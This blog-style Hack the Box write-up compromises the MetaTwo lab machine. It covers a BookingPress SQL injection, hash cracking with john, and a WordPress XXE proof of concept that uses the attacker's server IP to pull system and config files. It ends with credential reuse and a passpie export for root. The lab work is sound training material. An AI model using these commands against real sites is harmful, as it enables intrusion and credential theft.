+++
author = "Nick"
categories = ["hack the box", "Easy"]
date = 2023-04-29T11:00:00.000Z
publishDate = 2023-04-29T11:00:00.000Z
description = "MetaTwo is an easy Linux machine that features a website running Wordpress, which is using a plugin vulnerable to unauthenticated SQL injection (CVE-2022-0739). It can be exploited to reveal the password hash of the Wordpress users which can be cracked to obtain the password for the Wordpress user manager. The Wordpress version in use is vulnerable to an XXE Vulnerability in the Media Library (CVE-2021-29447), which can be exploited to obtain credentials for the FTP server. A file on the FTP server reveals the SSH credentials for user jnelson. For privilege escalation, the passpie utility on the remote host can be exploited to obtain the password for the root user."
draft = false
thumbnail = "/images/meta2/logo.png"
slug = "hack-the-box-meta-two"
summary = ""
tags = ["hack the box", "Easy", "Linux", "Wordpress", "Sanitation", "RCE", "CVE-2002-0739", "WPScan", "John", "Passpie"]
title = "Hack the Box - Meta 2"
url = "/hack-the-box-meta-two"
+++

Welcome back! Today we are doing the Hack the Box machine Meta 2. This machine is listed as an Easy Linux machine. Let's dive in. 

As usual, we start with an `rustscan` of the system. Here are the results:

```
Initiating Ping Scan at 11:12
Scanning 10.129.228.95 [2 ports]
Completed Ping Scan at 11:12, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:12
Completed Parallel DNS resolution of 1 host. at 11:12, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:12
Scanning 10.129.228.95 [3 ports]
Discovered open port 22/tcp on 10.129.228.95
Discovered open port 80/tcp on 10.129.228.95
Discovered open port 21/tcp on 10.129.228.95
Completed Connect Scan at 11:12, 0.05s elapsed (3 total ports)
Nmap scan report for 10.129.228.95
Host is up, received syn-ack (0.052s latency).
Scanned at 2023-03-22 11:12:18 EDT for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/local/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

We know that we're looking to get in via some sort of web access / exploit. Let's look at what is being hosted on port 80. We notice the site is a `Wordpress` site and that `/wp-admin/` has been disallowed via `robots.txt`. Whenever I run up against a `Wordpress` site, I always throw a quick `WPScan` at it to see what might be able to be leveraged.

Command:
`wpscan --url metapress.htb --plugins-version-detection aggressive --api-token TOKENHERE`

Now the output of this is interesting. We have quite a few vulnerable plugins being shown.

![](/images/meta2/meta1.png)

We get back a bunch of data, like our `Wordpress` version, `PHP` version and other findings. Now the thing here is that these findings are all `Wordpess` specific issues. Meaning they are not related to any plugin's, since none were found. However, we know that to not be accurate given we saw the ability to book time on the site as we were viewing it. While doing manual enumeration, you can see that the site is using `bookingpress` plugin to manage this function.

After researching and attempting some of recomended vulnerabilities, I decided to move into looking at the plugins themselves. After a quick google we can find a few vulnerabilities exist in the plugin. Sifting through the page source, we can deterime the version of the plugin.

![](/images/meta2/meta2.png)

Looks like we've got version 1.0.10 to work with. Lucky for us, an `Data Sanitation` exploit was found in verisons under 1.0.11!

[https://nvd.nist.gov/vuln/detail/CVE-2022-0739](https://nvd.nist.gov/vuln/detail/CVE-2022-0739)

There are a few PoC's out there, I chose the first one Google gave me - [https://github.com/destr4ct/CVE-2022-0739](https://github.com/destr4ct/CVE-2022-0739). 

Now in order for this to work, we need to obtain the `nonce` from our requests - enter `Burpsuite`! If you didn't want to use `Burpsuite` you could simply follow the `curl` PoC listed on the [`WP-Scan` page](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357). I myself, I like `Burpsuite`.

We input [bookingpress_form] in our fields and snoop the web requests. This should reveal our `nonce`.

![](/images/meta2/meta3.png)

![](/images/meta2/4meta3.png)

Now that we have our nonce, we can supply it to our `PoC`.

Command:
`python3 booking-press-expl.py -u http://metapress.htb -n f62de70443`

and we get a hash!

![](/images/meta2/meta5.png)

We can save these hashes to a file for cracking.

Command:
`john -w=/usr/share/wordlists/rockyou.txt hash.lst`

Right off the bat we get one password - `partylikearockstar`. A quick shot at using this password for the `FTP Service` is a bust - damn. Well, we do know that we can use this password to log into the wordpress site as the `manager`. 

If you're unfamiliar with `Wordpress`, that login is located, by default, in `/wp-admin/`. You probably could have guessed that by the `robots.txt` file, right?

Once logged in we can enumerate around a bit more for a better escalation method. Now this is where our `WPScan` from earlier is important. We know from this scan that we are running `Wordpress` version 5.6.2. So we have a few things to work with, a `Wordpress` version, an autorized user, `PHP` version and admin access. If we take what we now know and cross it against what we found via the original `WPScan`, we see that the `XXE` is a likley path forward.

```
 | [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
 ```

 [https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)

 This exploit has a failure in parsing WAVE audio files. Now we can do this manually or we can use this PoC - [https://github.com/Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC).

 We clone the repo down and supply our commands:

 Commands:
 `python3 CVE-2021-29447.py --url http://metapress.htb -u manager -p partylikearockstar --server-ip 10.10.14.2`

![](/images/meta2/meta6.png)

We can see that we've sucessfully extracted the `/etc/passwd` file! Now, we can use this to extract something a bit better, like say an `SSH Key`. We instruct the PoC to download the `SSH key` but no luck. It's either not there or permissions are locked out. Let's try to find something else of use. A common config file is the `wp-config.php` file. In order to get that, we need to know it's path. Now this is something we can get via `nginx` config file. That path is usually `/etc/nginx/sites-enabled/default`.

![](/images/meta2/meta7.png)

We see the path is under `/var/www/metapress.htb/blog`. Now we can extract the `wp-config` file and see what it might have.

![](/images/meta2/meta8.png)

We've now scored an `FTP` account!

![](/images/meta2/meta9.png)

We're now connected. We can start looking around for a privledged way into the box. We see the root directory for the blog is available as well as a directory called `mailer`. We see a file called `send_email.php`. We `GET` this file and examine it. Inside we see hardcoded credentials for `jnelson`!

![](/images/meta2/meta10.png)

Sure enough, these credentials work for `SSH`! We log in an get our `user.txt` flag!

![](/images/meta2/flag1.png)

Now we can start enumerating interally for a way to escalate to `root`. We transfer over a version of `linPEAS` and run it. While that runs we do a quick check with `sudo -l` to see if we have anything that sticks out as privledged. Nothing. 

Now as we're manually enumerating while `linPEAS` is running, we notice a directory called `.passpie`. Inside here is a file called `.keys`. This file is using `PGP`. We also see a file called `.config`. This file only has `{}` as it's content. Next up in the `root.pass` file. This file is encrypted, assumably with the `.key` file we just found.

Digging around `Github` we find the repo for the application - [https://github.com/marcwebbie/passpie](https://github.com/marcwebbie/passpie). So we run the application with no arguments to see what the output is:

![](/images/meta2/meta11.png)

Looking through the documentation, we see we can export the passwords into plain text.

![](/images/meta2/meta12.png)

Now when we try to do just that, we need a passphrase. In this scenario, it's safe to assume that the `.key` file is the passphrase *in* the `PGP` format. So we'll attempt to convert that `PGP` key into a crackable format. We can use `gpg2john` to convert the `.key` file.

Command:
`gpg2john key.php`

Once we've converted it over, we fire up our old friend `john` and let it go again.

Command:
`john -w=/usr/share/wordlists/rockyou.txt crackme.key`

![](/images/meta2/meta13.png)

It works! We have a passphrase of `blink182`. Now we can go back to `passpie` and try to use this as our passphrase for exporting the contents of the current password database. 

Command:
`passpie export root`

![](/images/meta2/meta14.png)

When we export this set, we see that `jnelson`'s password matches what we've found earlier. Giving us a high probability that the `root` password is correct. We `su` over to `root`!

![](/images/meta2/flag2.png)

There we have it, the `root` flag and the box is down! That was fun - see ya'll next time!